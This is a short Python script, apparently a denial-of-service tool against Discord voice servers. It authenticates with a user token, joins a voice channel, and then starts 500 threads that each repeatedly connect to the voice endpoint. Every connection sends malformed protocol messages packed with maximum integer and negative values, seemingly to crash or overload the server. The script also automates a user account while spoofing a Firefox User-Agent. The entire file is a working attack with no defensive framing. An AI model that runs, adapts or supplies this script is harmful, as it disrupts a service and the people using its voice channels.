from json import dumps,loads
from base64 import b64decode
from websocket import WebSocket
from time import sleep
from concurrent.futures import ThreadPoolExecutor

exec = ThreadPoolExecutor(max_workers=10000)

class GG:
    def __init__(self,token,gid,chid) -> None:
        self.ws = WebSocket()
        self.token = token
        self.userid = b64decode(token.split(".")[0]).decode("ascii")
        self.guildid = gid
        self.channid = chid

        self.endpoint = None
        self.token_ = None
        self.sessid = None

    def heartb(self,ws,heartbeat_interval):
        while 1:
            sleep(heartbeat_interval/1000)
            try:
                ws.send(dumps({"op": 1,"d": None}))
            except Exception:
                break

    def join(self):
        self.ws.connect("wss://gateway.discord.gg/?encoding=json&v=9&compress=json",header={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0"})
        heartbeat_interval = loads(self.ws.recv())['d']['heartbeat_interval']
        exec.submit(self.heartb,self.ws,heartbeat_interval)
        self.ws.send(dumps({"op": 2,"d":{"token": self.token,"properties": {"$os": "windows","$browser": "Discord","$device": "desktop"}}}))
        self.ws.send(dumps({"op":4,"d":{"guild_id":self.guildid,"channel_id":self.channid,"self_mute":True,"self_deaf":False,"self_video":False}}))

        while 1:
            payload = loads(self.ws.recv())
            #print(payload)
            if payload["t"] == "VOICE_SERVER_UPDATE":
                self.token_=payload["d"]["token"]
                self.endpoint=payload["d"]["endpoint"]
                break
            elif payload["t"] == "VOICE_STATE_UPDATE":
                if payload["d"]["user_id"] == self.userid:
                    self.sessid = payload["d"]["session_id"]
    
    def down(self):
        while 1:
            try:
                ws = WebSocket()
                ws.connect(f"wss://{self.endpoint}/?v=5")
                ws.send(dumps({"op":0,"d":{"server_id":self.guildid,"user_id":self.userid,"session_id":self.sessid,"token":self.token_,"video":True,"streams":[{"type":"video","rid":"100","quality":-1},{"type":"video","rid":"50","quality":9223372036854775807}]}},separators=(",", ":")).encode("UTF-8"))
                ws.send(b'{"op":12,"d":{"audio_ssrc":-1,"video_ssrc":-1,"rtx_ssrc":9223372036854775807,"streams":[{"type":"video","rid":"100","ssrc":-1,"active":true,"quality":9223372036854775807,"rtx_ssrc":9223372036854775807,"max_bitrate":9223372036854775807,"max_framerate":9223372036854775807,"max_resolution":{"type":"fixed","width":9223372036854775807,"height":9223372036854775807}}]}}')
                ws.send(b'{"op":5,"d":{"speaking":9223372036854775807,"delay":-1,"ssrc":9223372036854775807}}')
                ws.send(b'{"op":3,"d":-1}')
                ws.close()
            except Exception as e:
                print(e)

acc = GG("TOKEN_HERE","GUILD_ID","CHANNEL_ID")
print("setup")
acc.join()
print("start down")
for _ in range(500):
    exec.submit(acc.down)
